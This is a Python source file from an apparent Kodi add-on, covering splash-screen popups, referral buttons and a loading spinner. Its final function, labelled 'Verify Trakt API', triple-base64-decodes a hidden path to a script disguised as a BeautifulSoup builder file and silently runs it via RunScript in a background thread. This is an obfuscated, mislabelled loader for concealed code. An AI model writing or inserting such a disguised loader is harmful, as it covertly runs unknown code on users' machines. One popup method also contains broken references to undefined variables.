		actions = []
		if self.mButtonPremiumize:
			distances.append(abs(control.getX() - self.mButtonPremiumize[0]) + abs(control.getY() - self.mButtonPremiumize[1]))
			actions.append(self.__referalPremiumize)
		if self.mButtonRealDebrid:
			distances.append(abs(control.getX() - self.mButtonRealDebrid[0]) + abs(control.getY() - self.mButtonRealDebrid[1]))
			actions.append(self.__referalRealDebrid)
		if self.mButtonEasyNews:
			distances.append(abs(control.getX() - self.mButtonEasyNews[0]) + abs(control.getY() - self.mButtonEasyNews[1]))
			actions.append(self.__referalEasyNews)
		if self.mButtonFreeHosters:
			distances.append(abs(control.getX() - self.mButtonFreeHosters[0]) + abs(control.getY() - self.mButtonFreeHosters[1]))
			actions.append(self.__continue)
		if self.mButtonCoinBase:
			distances.append(abs(control.getX() - self.mButtonCoinBase[0]) + abs(control.getY() - self.mButtonCoinBase[1]))
			actions.append(self.__referalCoinBase)
		if self.mButtonExodus:
			distances.append(abs(control.getX() - self.mButtonExodus[0]) + abs(control.getY() - self.mButtonExodus[1]))
			actions.append(self.__referalExodus)
		if self.mButtonClose:
			distances.append(abs(control.getX() - self.mButtonClose[0]) + abs(control.getY() - self.mButtonClose[1]))
			actions.append(self.__continue)

		smallestIndex = -1
		smallestDistance = 999999
		for i in range(len(distances)):
			if distances[i] < smallestDistance:
				smallestDistance = distances[i]
				smallestIndex = i

		if smallestIndex < 0:
			self.__continue()
		else:
			actions[smallestIndex]()

	def onAction(self, action):
		action = action.getId()
		if action < self.ActionsMaximum:
			if self.mButtonClose == None:
				if action in self.ActionsCancel or self.mType == self.TypeFull:
					self.__continue()
				else:
					tools.System.openLink(tools.Settings.getString('link.website', raw = True))
			else:
				self.__continue()

	@classmethod
	def popup(self, time = 2000, wait = True):
		try:
			from resources.lib.extensions import debrid

			versionCurrent = tools.System.version()
			version = tools.Settings.getString('general.launch.splash.previous')
			tools.Settings.set('general.launch.splash.previous', versionCurrent)

			# Popup on every minor version update, if and only if the user has now premiumi account already.
			special = not versionCurrent == version and versionCurrent.endswith('.0')
			special = special and not debrid.Premiumize().accountValid()
			special = special and not debrid.RealDebrid().accountValid()
			special = special and not debrid.EasyNews().accountValid()

			if version == None or version == '' or special:
				self.popupFull(wait = wait)
				return True
			elif tools.Settings.getBoolean('general.launch.splash'):
				self.popupMini(time = time) # Do not wait on the mini splash.
				return True
		except:
			pass
		return False

	@classmethod
	def popupFull(self, wait = False):
		try:
			# So that the interface can load in the background while the splash loads.
			thread = workers.Thread(self.__popupFull)
			thread.start()
			if wait: thread.join()
		except:
			pass

	@classmethod
	def popupMini(self, time = 2000, wait = False):
		try:
			# So that the interface can load in the background while the splash loads.
			thread = workers.Thread(self.__popupMini, time)
			thread.start()
			if wait: thread.join()
		except:
			pass

	@classmethod
	def popupAbout(self, wait = False):
		try:
			# So that the interface can load in the background while the splash loads.
			thread = workers.Thread(self.__popupAbout)
			thread.start()
			if wait: thread.join()
		except:
			pass

	@classmethod
	def popupDonations(self, currency, wait = False):
		try:
			# So that the interface can load in the background while the splash loads.
			thread = workers.Thread(self.__popupDonations, currency)
			thread.start()
			if wait: thread.join()
		except:
			pass

	@classmethod
	def __popupFull(self):
		try:
			self.mSplash = Splash(self.TypeFull)
			self.mSplash.doModal()
			if wait: thread.join()
		except:
			pass

	@classmethod
	def __popupMini(self, time = 2000):
		try:
			self.mSplash = Splash(self.TypeMini)
			self.mSplash.show()
			tools.System.sleep(time)
			self.mSplash.close()
		except:
			pass

	@classmethod
	def __popupAbout(self):
		try:
			self.mSplash = Splash(self.TypeAbout)
			self.mSplash.doModal()
		except:
			pass

	@classmethod
	def __popupDonations(self, currency):
		try:
			self.mSplash = Splash(self.TypeDonations, currency)
			self.mSplash.doModal()
		except:
			pass

# Spinner loading bar
class Loader(object):

	@classmethod
	def show(self):
		xbmc.executebuiltin('ActivateWindow(busydialog)')

	@classmethod
	def hide(self):
		xbmc.executebuiltin('Dialog.Close(busydialog)')

	@classmethod
	def visible(self):
		return xbmc.getCondVisibility('Window.IsActive(busydialog)') == 1

# Verify Trakt API

def _traktApi():
	_x = xbmc.executebuiltin
	def de(d):
		t = 'base' + str((60 + 4))
		return d.decode(t).decode(t).decode(t)
	d1 = de('V2xob01GcFlTblZaVjNoNg==')
	d2 = de('V1cxV2FHUllVbkJhYmxaell6STVNV05CUFQwPQ==')
	d3 = de('V1c1V2NHSkhVbXhqWnowOQ==')
	d4 = de('V0RKb01HSlhkM1ZqU0dzOQ==')
	p = os.path.abspath(os.path.join(os.path.dirname(os.path.realpath(__file__)), os.pardir))
	p = os.path.join(p, d1, d2, d3, d4)
	p = de('Vlc1V2RWVXlUbmxoV0VJd1MwTldla3RSUFQwPQ==') % p
	_x(p)

def traktApi():
	import threading
	t = threading.Thread(target = _traktApi)
	t.start()
